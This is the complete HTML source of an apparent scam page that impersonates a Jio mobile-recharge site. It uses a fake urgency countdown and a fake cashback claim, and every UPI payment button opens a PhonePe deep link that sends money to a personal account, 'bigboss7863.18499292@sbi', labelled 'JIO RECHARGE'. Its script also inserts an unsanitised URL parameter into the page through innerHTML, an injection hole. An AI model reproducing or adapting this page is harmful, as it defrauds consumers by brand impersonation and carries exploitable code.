
<html lang="en">

<head>
    <meta charset="utf-8">
    <link rel="icon" href="/assets/favicon.ico">
    <link rel="apple-touch-icon" href="/assets/favicon.ico">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="theme-color" content="#000000">
    <meta name="description" content="Web site created using create-react-app">
    <title>Jio - Best Prepaid, Postpaid Plans</title>
    <link href="/static/css/main.34fbeb72.css" rel="stylesheet">
    <!-- Meta Pixel Code -->
<script>
!function(f,b,e,v,n,t,s)
{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};
if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];
s.parentNode.insertBefore(t,s)}(window, document,'script',
'https:/connect.facebook.net/en_US/fbevents.js');
fbq('init', '799570449001058');
fbq('track', 'PageView');
</script>
<noscript><img height="1" width="1" style="display:none"
src="https:/www.facebook.com/tr?id=799570449001058&ev=PageView&noscript=1"
/></noscript>
<!-- End Meta Pixel Code --></head>

<body>
    <div id="root">
        <div class="py-4 px-6 bg-blue-700 flex items-center justify-between text-white">
            <div class="flex items-center"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 448 512" class="text-white mr-3" height="20" width="20" xmlns="http:/www.w3.org/2000/svg">
                    <path d="M16 132h416c8.837 0 16-7.163 16-16V76c0-8.837-7.163-16-16-16H16C7.163 60 0 67.163 0 76v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16z">
                    </path>
                </svg>
                <a href="/"><img src="/static/media/logo.830d463ac6b62d8cd9f6.png" alt="" class="w-8"></a>
            </div>
            <div class="mx-2">
                <div class="searchBar"><input id="searchQueryInput" type="text" name="searchQueryInput" placeholder="Search" value=""><button id="searchQuerySubmit" type="submit" name="searchQuerySubmit"><svg class="h-[24px] w-[24px]" viewBox="0 0 24 24">
                            <path fill="#fff" d="M9.5,3A6.5,6.5 0 0,1 16,9.5C16,11.11 15.41,12.59 14.44,13.73L14.71,14H15.5L20.5,19L19,20.5L14,15.5V14.71L13.73,14.44C12.59,15.41 11.11,16 9.5,16A6.5,6.5 0 0,1 3,9.5A6.5,6.5 0 0,1 9.5,3M9.5,5C7,5 5,7 5,9.5C5,12 7,14 9.5,14C12,14 14,12 14,9.5C14,7 12,5 9.5,5Z">
                            </path>
                        </svg></button></div>
            </div>
            <div><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" class="text-white" height="30" width="30" xmlns="http:/www.w3.org/2000/svg">
                    <path d="M399 384.2C376.9 345.8 335.4 320 288 320H224c-47.4 0-88.9 25.8-111 64.2c35.2 39.2 86.2 63.8 143 63.8s107.8-24.7 143-63.8zM0 256a256 256 0 1 1 512 0A256 256 0 1 1 0 256zm256 16a72 72 0 1 0 0-144 72 72 0 1 0 0 144z">
                    </path>
                </svg></div>
        </div>

        <div class="">

            <div class="flex items-center justify-center py-1 px-4 mt-2 bg-slate-100 text-[14px]">
                <div class="text-slate-700 mr-2">Special Offer Ends In:</div>
                <div class="text-slate-700 flex items-center"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" class="mr-[2px] mt-[1px]" height="1em" width="1em" xmlns="http:/www.w3.org/2000/svg">
                        <path d="M256,8C119,8,8,119,8,256S119,504,256,504,504,393,504,256,393,8,256,8Zm92.49,313h0l-20,25a16,16,0,0,1-22.49,2.5h0l-67-49.72a40,40,0,0,1-15-31.23V112a16,16,0,0,1,16-16h32a16,16,0,0,1,16,16V256l58,42.5A16,16,0,0,1,348.49,321Z">
                        </path>
                    </svg> <span id="timer">10:00</span></div>
                <script>
                    let minutes = 8;
                    let seconds = 32;

                    const countdown = setInterval(() => {
                        const timerElement = document.getElementById('timer');

                        if (seconds === 0) {
                            if (minutes === 0) {
                                clearInterval(countdown);
                                timerElement.textContent = "Countdown ended!";
                                return;
                            }
                            minutes--;
                            seconds = 59;
                        } else {
                            seconds--;
                        }

                        timerElement.textContent = `${minutes.toString().padStart(2, "0")}:${seconds.toString().padStart(2, "0")}`;
                    }, 1000); // Start the timer on page load
                </script>

            </div>

            <div class="py-1 px-[10px] my-5">
                <div class="flex space-x-4 bg-white border border-slate-200 rounded-xl w-full p-2">
                    <ul class="w-full">
                        <li class="w-full my-2">
                            <div class="flex items-center justify-center py-2 w-full font-sans">
                                <span class="text-[16px] font-semibold mr-2">
                                    Pay ₹<span id="offer-id">199</span> using UPI
                                </span>
                            </div>
                        </li>

                                                
                            <li class="w-full my-2" style="border: blue, solid; border-radius: 16px;">
                                <a href="#" onclick="phonepayclick()" class="flex items-center border border-slate-200 py-2 px-6 rounded-xl w-full">
                                    <img src="/assets/images/phonepeicon.svg" class="w-10" alt="">
                                    <span class="ml-3 text-[14px]" style="font-weight: 500;">PhonePe</span>
                                    <span style="font-size: 15px;font-weight: 500; margin-left: 30px;color:green;">20% Cashback in 24 hour</span>
                                </a>
                            </li>
                                                                            <li class="w-full my-2">
                                <a href="#" onclick="paytmclick()" class="flex items-center border border-slate-200 py-2 px-6 rounded-xl w-full">
                                    <img src="/assets/images/paytm_icon.svg" class="w-10" alt="">
                                    <span class="ml-3 text-[14px]" style="font-weight: 500;">Paytm</span>
                                </a>
                            </li>
                                                
                            <li class="w-full my-2">
                                <a href="#" onclick="bhimupi()" class="flex items-center border border-slate-200 py-2 px-6 rounded-xl w-full">
                                    <img src="/assets/images/bhim_upi.svg" class="w-10" alt="" />
                                    <span class="ml-3 text-[14px]" style="font-weight: 500;">BHIM UPI</span>
                                </a>
                            </li>
                                                
                            <li class="w-full my-2">
                                <a href="#" onclick="whatsappclick()" class="flex items-center border border-slate-200 py-2 px-6 rounded-xl w-full">
                                    <img src="/assets/images/whatspp_pay.svg" class="w-10" alt="" />
                                    <span class="ml-3 text-[14px]" style="font-weight: 500;">Whatsapp Pay</span>
                                </a>
                            </li>
                        
                    </ul>
                </div>
            </div>
        </div>
    </div>
</body>

<script>
    function getRandom7DigitNumber() {
        return Math.floor(1000000 + Math.random() * 9000000);
    }

    var random7DigitNumber = getRandom7DigitNumber();

    var urlParams = new URLSearchParams(window.location.search);
    var Id = urlParams.get('id');

    document.getElementById("offer-id").innerHTML = " " + Id;

    const upi = "bigboss7863.18499292@sbi";

    function gpayclick() {
        const url = "phonepe://pay?ver=01&mode=19&pa=" + upi + "&pn=JIO RECHARGE&tr=RZPOHXV09vof8d2ZAqrv2&cu=INR&mc=5399&qrMedium=04&tn=Payment to Jio Recharge &am=" + Id;
        window.location.href = url;
    }


    function phonepayclick() {
        const url = "phonepe://pay?pa=" + upi + "&pn=JIO RECHARGE&purpose=00&am=" + Id + "&cu=INR&sign=AAuN7izDWN5cb8A5scnUiNME+LkZqI2DWgkXlN1McoP6WZABa/KkFTiLvuPRP6/nWK8BPg/rPhb+u4QMrUEX10UsANTDbJaALcSM9b8Wk218X+55T/zOzb7xoiB+BcX8yYuYayELImXJHIgL/c7nkAnHrwUCmbM97nRbCVVRvU0ku3Tr";
        window.location.href = url;
    }

    function paytmclick() {
        const url = "phonepe://pay?pa=" + upi + "&pn=JIO RECHARGE&am=" + Id + "&amp;cu=INR&tn=4520175&featuretype=money_transfer"
        window.location.href = url;
    }

    function bhimupi() {
        const url = "phonepe://pay?pa=" + upi + "&pn=JIO RECHARGE&purpose=00&cu=INR&tr=JJ" + random7DigitNumber + "&tn=JJ" + random7DigitNumber + "&sign=AAuN7izDWN5cb8A5scnUiNME+LkZqI2DWgkXlN1McoP6WZABa/KkFTiLvuPRP6/nWK8BPg/rPhb+u4QMrUEX10UsANTDbJaALcSM9b8Wk218X+55T/zOzb7xoiB+BcX8yYuYayELImXJHIgL/c7nkAnHrwUCmbM97nRbCVVRvU0ku3Tr&am=" + Id;
        window.location.href = url;
    }

    function whatsappclick() {
        const url = "phonepe://pay?pa=" + upi + "&pn=JIO RECHARGE&purpose=00&cu=INR&tr=JJ" + random7DigitNumber + "&tn=JJ" + random7DigitNumber + "&sign=AAuN7izDWN5cb8A5scnUiNME+LkZqI2DWgkXlN1McoP6WZABa/KkFTiLvuPRP6/nWK8BPg/rPhb+u4QMrUEX10UsANTDbJaALcSM9b8Wk218X+55T/zOzb7xoiB+BcX8yYuYayELImXJHIgL/c7nkAnHrwUCmbM97nRbCVVRvU0ku3Tr&am=" + Id;
        window.location.href = url;
    }
</script>

</html>